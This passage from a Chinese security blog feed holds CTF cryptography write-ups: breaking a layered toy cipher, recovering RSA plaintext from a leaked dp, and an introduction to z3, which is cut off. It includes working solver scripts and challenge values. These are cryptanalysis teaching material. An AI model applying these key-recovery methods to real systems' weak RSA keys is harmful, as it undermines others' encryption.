251\\</script><p>17的逆元也很好求，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">print</span> gmpy2.invert(<span class="number">17</span>,<span class="number">251</span>)</span><br></pre></td></tr></table></figure></p><p>即可得到192<br>故此，这一层我们可以轻松取逆</p><script type="math/tex; mode=display">b \equiv c*192 \text{ } mod \text{ } 251\\</script><h2 id="layer3"><a href="#layer3" class="headerlink" title="layer3"></a>layer3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layer3</span><span class="params">(data)</span>:</span></span><br><span class="line">    output = []</span><br><span class="line">    key = number.bytes_to_long(os.urandom(<span class="number">128</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        key = (key * <span class="number">0xc8763</span> + <span class="number">9487</span>) % <span class="number">0x10000000000000000</span></span><br><span class="line">        output.append((i ^ key) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">return</span> bytes(output)</span><br></pre></td></tr></table></figure><p>这一步也很简单，将layer2的结果用同一个key进行异或加密，其中key是最开始随机生成的<br>乍一看，这里的key无法预测，极大，爆破无解，但是仔细分析，发现只是纸老虎<br>我们观察到对key的处理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = (key * <span class="number">0xc8763</span> + <span class="number">9487</span>) % <span class="number">0x10000000000000000</span></span><br><span class="line">output.append((i ^ key) &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure></p><p>这里的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(i ^ key) &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure></p><p>是可以使用分配律的，可以拆分为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(i&amp;0xff)^(key&amp;0xff)</span><br></pre></td></tr></table></figure></p><p>这样一来，我们的key就变成了<code>0~256</code>的一个极小的数，简单爆破即可<br>并且因为i一定在<code>0x00~0xff</code>这个范围内，所以这一层的求逆也变得很容易<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">layer3(c,x)</span><br></pre></td></tr></table></figure></p><p>即可，其中</p><script type="math/tex; mode=display">x \in （0，256）</script><h2 id="layer4"><a href="#layer4" class="headerlink" title="layer4"></a>layer4</h2><p>来到最后一层<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layer4</span><span class="params">(data)</span>:</span></span><br><span class="line">    iv = os.urandom(<span class="number">256</span>)</span><br><span class="line">    output = iv</span><br><span class="line"></span><br><span class="line">    hexencoded = binascii.hexlify(data)</span><br><span class="line">    length_target = (len(hexencoded) + <span class="number">3</span>) // <span class="number">4</span></span><br><span class="line">    padded = hexencoded.ljust(length_target * <span class="number">4</span>, <span class="string">b'f'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(padded), <span class="number">4</span>):</span><br><span class="line">        r = rsa_encrypt(padded[i:i+<span class="number">4</span>])</span><br><span class="line">        block = binascii.unhexlify(<span class="string">'%.512x'</span> % r)</span><br><span class="line">        output += xor(output[<span class="number">-256</span>:], block)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(output)</span><br></pre></td></tr></table></figure></p><p>首先是padded<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iv = os.urandom(<span class="number">256</span>)</span><br><span class="line">output = iv</span><br><span class="line">hexencoded = binascii.hexlify(data)</span><br><span class="line">length_target = (len(hexencoded) + <span class="number">3</span>) // <span class="number">4</span></span><br><span class="line">padded = hexencoded.ljust(length_target * <span class="number">4</span>, <span class="string">b'f'</span>)</span><br></pre></td></tr></table></figure></p><p>保证data的hex长度是4的倍数，不够用f补齐<br>然后<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(padded), <span class="number">4</span>):</span><br><span class="line">        r = rsa_encrypt(padded[i:i+<span class="number">4</span>])</span><br><span class="line">        block = binascii.unhexlify(<span class="string">'%.512x'</span> % r)</span><br><span class="line">        output += xor(output[<span class="number">-256</span>:], block)</span><br></pre></td></tr></table></figure></p><p>将之前加上padding的密文每4个一组，然后进行rsa加密，然后格式化为512长度的无符号16进制，再进行异或加密，这里异或的key是<code>output[-256:]</code>，并且一直在变化<br>大致变化如下<br><img src="/images/2018-08-24-13-45-35.png" alt=""><br>想反解也很容易<br>用C的后一块异或前一块即可<br>可以理解为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c[i<span class="number">-256</span>:i]^c[i:i+<span class="number">256</span>]</span><br></pre></td></tr></table></figure></p><p>即可得到RSA的密文<br>那么这里的RSA怎么处理呢？<br>我们看一下RSA的n和e<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">q = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = number.getPrime(<span class="number">24</span>)</span><br></pre></td></tr></table></figure></p><p>这样随机生成的大n是无法直接破解的，但是我们不难发现<br>这里RSA加密的消息长度极短，长度只有4，所以这里我们可以用他的n和e遍历加密一遍<br>生成一个我们的字典，然后根据密文，选择明文即可<br>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dec = &#123;&#125;</span><br><span class="line">for i in range(0x10000):</span><br><span class="line">    x = b&apos;%.4x&apos; % i</span><br><span class="line">    v = number.bytes_to_long(x)</span><br><span class="line">    dec[pow(v, e, n)] = x</span><br></pre></td></tr></table></figure></p><p>这样即可成功破解layer4</p><h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><p>那么根据上述的思路，我们容易写出如下脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line">n=<span class="number">0x80dd2dec6684d43bd8f2115c88717386b2053bdb554a12d52840380af48088b7f1f71c3d3840ef4615af318bbe261d2d2d90616c0d2dcb6414e05c706f2b6d700ed98128048a2b79f57d2c6476add369ec96fb0fed936506d9aee4da5d36aaa97f117b082924c0638923e4367f250cc6cd23918702d98c5359bbb6bad2bef741c65362ad40355fd2edb35248256413d0ee576e7a351f17b9a5a3a7eebbbb2b22f27c342ef6dcaf1396085a105cf5e8b9bbf80e002053347fd9db6e83dc63599b1e1e5a81f7f2e4e2473bc2d14d040c9c6e6f62b9027853c7550a10df49c3a786962c9e9d5b95551a95077d0bd354b88ef31c5625e21edf98f721504f73e1b867</span></span><br><span class="line">e=<span class="number">0xcf98d5</span></span><br><span class="line">lines = open(<span class="string">'encrypted'</span>).readlines()</span><br><span class="line">data = base64.b64decode(lines[<span class="number">3</span>].strip())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        res+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">dec = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">    x = <span class="string">b'%.4x'</span> % i</span><br><span class="line">    v = number.bytes_to_long(x)</span><br><span class="line">    dec[pow(v, e, n)] = x</span><br><span class="line">raw = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>, len(data), <span class="number">256</span>):</span><br><span class="line">    prev = data[i<span class="number">-256</span>:i]</span><br><span class="line">    curr = int(xor(prev, data[i:i+<span class="number">256</span>]).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">    raw += dec[curr]</span><br><span class="line">data = raw.decode(<span class="string">'hex'</span>)</span><br><span class="line">r = number.inverse(<span class="number">17</span>, <span class="number">251</span>)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    output=<span class="string">''</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        key = (key * <span class="number">0xc8763</span> + <span class="number">9487</span>) % <span class="number">0x10000000000000000</span></span><br><span class="line">        output+=chr((ord(i) ^ key) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> output:</span><br><span class="line">        res += chr((ord(i)*r)%<span class="number">251</span>)</span><br><span class="line">    <span class="keyword">if</span> res[<span class="number">4</span>:<span class="number">5</span>]==<span class="string">'&#123;'</span> <span class="keyword">and</span> res[<span class="number">-2</span>:] == <span class="string">'&#125;\n'</span>:</span><br><span class="line">        <span class="keyword">print</span> res</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>运行后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SKIT&#123;I VMWPQ ALBCD SBY JMONE BXZL UGZ KIFR HBT WD UGZ PKBMHR HIR CWUGBMU LIWD.&#125;</span><br></pre></td></tr></table></figure></p><p>然后去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://quipqiup.com/</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-24-14-39-32.png" alt=""><br>即可得到flag</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>从这道题里，可以学到一些代换的知识，并且可以得出一个不成熟的推论，就是密码题中如果频繁使用了xor，那么一定有问题XD</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;figure class=&quot;highligh
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>RSA之拒绝套路(1)</title>
    <link href="http://skysec.top/2018/08/24/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF(1)/"/>
    <id>http://skysec.top/2018/08/24/RSA之拒绝套路(1)/</id>
    <published>2018-08-24T00:35:45.000Z</published>
    <updated>2018-10-06T03:28:02.646Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发在合天智汇</span><br></pre></td></tr></table></figure></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期在复习数论和密码学的题目，于是先从RSA开始，做一些题目推导与证明<br>希望知其然，知其所以然，而不是一味的跟着套路走</p><h2 id="RSA大众套路"><a href="#RSA大众套路" class="headerlink" title="RSA大众套路"></a>RSA大众套路</h2><p>在拒绝套路之前，先给出常见的套路<br>曾经这篇文章已经总结的很好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/84632</span><br></pre></td></tr></table></figure></p><p>这里简单的概述总结一下：</p><ul><li>1.e较大：Wiener攻击</li><li>2.e较小：直接开方</li><li>3.低加密指数广播攻击：相同低指数的e和多个相同的消息m</li><li>4.Coppersmith定理攻击：只有部分高位的p或q</li><li>5.共模攻击：相同n，相同m<br>……..<br>话不多说，下面从非套路的题目开始</li></ul><h2 id="题干"><a href="#题干" class="headerlink" title="题干"></a>题干</h2><p>例如题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure></p><p>注意，其中dp的意思为：</p><script type="math/tex; mode=display">dp \equiv d \text{ } mod \text{ } (p-1)</script><h2 id="公式推导"><a href="#公式推导" class="headerlink" title="公式推导"></a>公式推导</h2><p>现在我们可以知道的是</p><script type="math/tex; mode=display">c \equiv m^{e} \text{ } mod \text{ } n \\m \equiv c^{d} \text{ } mod \text{ } n \\\phi (n) = (p-1)*(q-1) \\d*e \equiv 1 \text{ } mod \text{ } \phi (n) \\dp \equiv d \text{ } mod \text{ } (p-1)</script><p>由式5*e可以得到</p><script type="math/tex; mode=display">dp*e \equiv d*e \text{ } mod \text{ } (p-1)</script><p>因此可以得到</p><script type="math/tex; mode=display">d*e = k*(p-1)+dp*e \\d*e \equiv 1 \text{ } mod \text{ } \phi (n) \\</script><p>我们将式1带入式2可以得到</p><script type="math/tex; mode=display">k*(p-1)+dp*e \equiv 1 \text{ } mod \text{ } (p-1)*(q-1)</script><p>故此可以得到</p><script type="math/tex; mode=display">k_2*(p-1)*(q-1)+1=k_1*(p-1)+dp*e</script><p>变换一下</p><script type="math/tex; mode=display">(p-1)*[k_2*(q-1)-k_1]+1=dp*e</script><p>因为</p><script type="math/tex; mode=display">dp<p-1</script><p>可以得到</p><script type="math/tex; mode=display">e>k_2*(q-1)-k1</script><p>我们假设</p><script type="math/tex; mode=display">x=k_2*(q-1)-k1</script><p>可以得到x的范围为</p><script type="math/tex; mode=display">(0,e)</script><p>因此有</p><script type="math/tex; mode=display">x*(p-1)+1=dp*e</script><p>那么我们可以遍历</p><script type="math/tex; mode=display">x \in (0,e)</script><p>求出p-1，求的方法也很简单，遍历65537种可能，其中肯定有一个p可以被n整除<br>那么求出p和q，即可利用</p><script type="math/tex; mode=display">\phi (n) = (p-1)*(q-1) \\d*e \equiv 1 \text{ } mod \text{ } \phi (n) \\</script><p>推出</p><script type="math/tex; mode=display">d \equiv 1*e^{-1}  \text{ } mod \text{ } \phi (n)</script><p>注：这里的-1为逆元，不是倒数的那个-1</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>写下如下脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">            p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">            q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi)%phi</span><br><span class="line">            <span class="keyword">print</span> libnum.n2s(pow(c,d,n))</span><br></pre></td></tr></table></figure></p><p>即可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;</span><br></pre></td></tr></table></figure></p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>现在不难得出结论，RSA中，如果dp或者dq任意一个泄露都可以导致密文被破解<br>因为上述的证明过程，没有用到任何特例情况。<br>但是如果e较大的话，可能会比较困难一些，但是如果e过大，那就可以使用维纳攻击了XD</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;figure class=&quot;highligh
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>从一道Crypto题目认识z3</title>
    <link href="http://skysec.top/2018/08/23/%E4%BB%8E%E4%B8%80%E9%81%93Crypto%E9%A2%98%E7%9B%AE%E8%AE%A4%E8%AF%86z3/"/>
    <id>http://skysec.top/2018/08/23/从一道Crypto题目认识z3/</id>
    <published>2018-08-23T06:59:49.000Z</published>
    <updated>2018-10-06T03:28:08.190Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/156915</span><br></pre></td></tr></table></figure></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在看Crypto，一直听闻z3的强大，近日终于体验了一次，做一下记录</p><h2 id="题干分析"><a href="#题干分析" class="headerlink" title="题干分析"></a>题干分析</h2><p>题目直接给出了密文生成文本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">m = sympy.randprime(<span class="number">2</span>**<span class="number">257</span>, <span class="number">2</span>**<span class="number">258</span>)</span><br><span class="line">M = sympy.randprime(<span class="number">2</span>**<span class="number">257</span>, <span class="number">2</span>**<span class="number">258</span>)</span><br><span class="line">a, b, c = [(sympy.randprime(<span class="number">2</span>**<span class="number">256</span>, <span class="number">2</span>**<span class="number">257</span>) % m) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">x = (a + b * <span class="number">3</span>) % m</span><br><span class="line">y = (b - c * <span class="number">5</span>) % m</span><br><span class="line">z = (a + c * <span class="number">8</span>) % m</span><br><span class="line"></span><br><span class="line">flag = int(open(<span class="string">'flag'</span>, <span class="string">'rb'</span>).read().strip().hex(), <span class="number">16</span>)</span><br><span class="line">p = pow(flag, a, M)</span><br><span class="line">q = pow(flag, b, M)</span><br><span class="line"></span><br><span class="line">json.dump(&#123; key: globals()[key] <span class="keyword">for</span> key <span class="keyword">in</span> <span class="string">"Mmxyzpq"</span> &#125;, open(<span class="string">'crypted'</span>, <span class="string">'w'</span>))</span><br></pre></td></tr></table></figure></p><p>题目的意思很简单：<br>1.生成两个随机大素数m,M<br>2.利用m再生成3个随机大数a,b,c<br>3.再利用a,b,c,m生成3个随机大数x,y,z<br>4.类RSA，将flag用公钥a加密，模数为M<br>5.类RSA，将flag用公钥b加密，模数为M<br>（注：这里不准确，并不是真RSA，说公钥和模数是方便类比）<br>然后我们已知的信息为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;p&quot;: 240670121804208978394996710730839069728700956824706945984819015371493837551238, </span><br><span class="line">&quot;q&quot;: 63385828825643452682833619835670889340533854879683013984056508942989973395315, </span><br><span class="line">&quot;M&quot;: 349579051431173103963525574908108980776346966102045838681986112083541754544269, </span><br><span class="line">&quot;z&quot;: 213932962252915797768584248464896200082707350140827098890648372492180142394587, </span><br><span class="line">&quot;m&quot;: 282832747915637398142431587525135167098126503327259369230840635687863475396299, </span><br><span class="line">&quot;x&quot;: 254732859357467931957861825273244795556693016657393159194417526480484204095858, </span><br><span class="line">&quot;y&quot;: 261877836792399836452074575192123520294695871579540257591169122727176542734080</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以想解决这个问题的关键点应该在于a和b，毕竟其他的信息都给出了，除了a和b</p><h2 id="解题思考（1）"><a href="#解题思考（1）" class="headerlink" title="解题思考（1）"></a>解题思考（1）</h2><p>如果我们得到了a和b，应该如何解决这道题呢？<br>乍一看，很困难，两个密文p和q都是利用类RSA的算法得到的，而M是大素数，强行突破肯定不容易<br>但这里讲到RSA，相信大家都知道RSA的共模攻击，那这里的题目是不是很相似呢？<br>我们先看看什么是RSA共模攻击：<br>这里简单给大家推导一下，如果RSA不知道是什么的话，建议先谷歌学一下概念<br>首先是基本条件，我们有：<br><img src="/images/2018-08-22-15-33-23.png" alt=""><br>那么根据贝祖等式:<br><img src="/images/2018-08-22-15-33-33.png" alt=""><br>我们一定可以得到<br><img src="/images/2018-08-22-15-33-42.png" alt=""><br>那么我们将最初的两个等式进行变形<br><img src="/images/2018-08-22-15-33-53.png" alt=""><br>我们将其相乘<br><img src="/images/2018-08-22-15-34-02.png" alt=""><br>则得到<br><img src="/images/2018-08-22-15-34-06.png" alt=""><br>到此，我们可以在不知道私钥的情况下，得到明文<br>我们再回到这道题目里<br><img src="/images/2018-08-22-15-34-13.png" alt=""><br>我们同样可以得到<br><img src="/images/2018-08-22-15-34-36.png" alt=""><br>又根据贝祖等式<br><img src="/images/2018-08-22-15-34-41.png" alt=""><br>我们能有结果为<br><img src="/images/2018-08-22-15-34-50.png" alt=""><br>故此我们又得到一个隐形的约束条件：<br><img src="/images/2018-08-22-15-34-55.png" alt=""></p><h2 id="解题思考2"><a href="#解题思考2" class="headerlink" title="解题思考2"></a>解题思考2</h2><p>我们如何求出a和b？<br>我们有如下约束条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = [(sympy.randprime(2**256, 2**257) % m) for _ in range(3)]</span><br><span class="line">x = (a + b * 3) % m</span><br><span class="line">y = (b - c * 5) % m</span><br><span class="line">z = (a + c * 8) % m</span><br></pre></td></tr></table></figure></p><p>此时，我们知道x,y,z,m<br>按照道理说，这里的约束条件，在不做任何思考的条件下，我们可以用如下方法爆破出来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="number">213932962252915797768584248464896200082707350140827098890648372492180142394587</span></span><br><span class="line">m=<span class="number">282832747915637398142431587525135167098126503327259369230840635687863475396299</span></span><br><span class="line">x=<span class="number">254732859357467931957861825273244795556693016657393159194417526480484204095858</span></span><br><span class="line">y=<span class="number">261877836792399836452074575192123520294695871579540257591169122727176542734080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,m):</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>,m):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>,m):</span><br><span class="line"><span class="keyword">if</span> x == (a + b * <span class="number">3</span>) % m <span class="keyword">and</span> y == (b - c * <span class="number">5</span>) % m <span class="keyword">and</span> z == (a + c * <span class="number">8</span>) % m <span class="keyword">and</span> gcd(a,b)=<span class="number">1</span>:</span><br><span class="line"><span class="keyword">print</span> a,b,c</span><br></pre></td></tr></table></figure></p><p>但是这显然是一种极其不理智的做法，因为解题概率极低<br>这里就要用到一个神奇了：<code>SMT约束求解器Z3</code></p><h2 id="Z3快速入门"><a href="#Z3快速入门" class="headerlink" title="Z3快速入门"></a>Z3快速入门</h2><h3 id="z3安装"><a href="#z3安装" class="headerlink" title="z3安装"></a>z3安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install z3-solver</span><br></pre></td></tr></table></figure><p>即可安装成功</p><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>我们看这样一个三元一次方程组的问题<br><img src="/images/2018-08-22-15-35-21.png" alt=""><br>那么我们如何利用z3约束迅速求解呢？<br>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">z = Int(<span class="string">'z'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(y==<span class="number">2</span>*x<span class="number">-7</span>)</span><br><span class="line">s.add(<span class="number">5</span>*x+<span class="number">3</span>*y+<span class="number">2</span>*z==<span class="number">3</span>)</span><br><span class="line">s.add(<span class="number">3</span>*x+z==<span 